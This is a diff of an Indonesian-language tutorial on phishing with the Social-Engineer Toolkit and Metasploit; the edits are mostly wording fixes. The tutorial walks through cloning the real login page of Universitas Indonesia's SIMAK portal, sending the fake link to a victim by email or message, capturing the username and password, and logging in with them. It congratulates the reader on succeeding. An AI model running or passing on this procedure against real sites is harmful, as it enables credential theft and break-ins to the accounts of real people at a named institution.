@@ -20,7 +20,7 @@ Contoh serangan social engineering:
    sudo apt install set
    ```
 
-  Setup dan jalankan Metasploit:
+### 2. Setup dan jalankan Metasploit:
 
   ```
   sudo msfdb init
@@ -172,7 +172,7 @@ Contoh skenario:
    set:webattack> Enter the url to clone: 
    ```
 
-   Pada tahap ini kita diminta untuk memasukkan alamat url yang mau kita clone. disini debagai contoh, kita masukkan url login dari website login `SIMAK UI` (Universitas Indonesia).
+   Pada tahap ini kita diminta untuk memasukkan alamat url yang mau kita clone. di sini sebagai contoh, kita masukkan url login dari website login `SIMAK UI` (Universitas Indonesia).
 
    ```
    set:webattack> Enter the url to clone: https://penerimaan.ui.ac.id/login
@@ -186,7 +186,7 @@ Contoh skenario:
    [*] Information will be displayed to you as it arrives below:
    ```
 
-   Tahap selanjutnya kirim alamat IP kita ke korban melalui `E-mail` atau `pesan`, tunggu sampai korban memasukkan `Username/E-mail` dan `Password` yang benar.
+   Tahap selanjutnya adalah mengirim tautan phishing kepada target, misalnya melalui `email` atau `pesan instan`. Tunggu sampai korban memasukkan `username/email` dan `password` yang benar.
 
    ```
    [*] WE GOT A HIT! Printing the output:
@@ -197,7 +197,7 @@ Contoh skenario:
    [*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
    ```
 
-   Boom...! Selamat Anda sudah mendapatkan `Username/E-mail` dan `Password` yang benar. Sekarang Anda bisa login dengan kredensial tersebut:
+   Boom...! Selamat Anda sudah mendapatkan `username/email` dan `password` yang benar. Sekarang Anda bisa login ke website SIMAK UI dengan kredensial tersebut:
 
    ```
    username=adminui@ui.ac.id
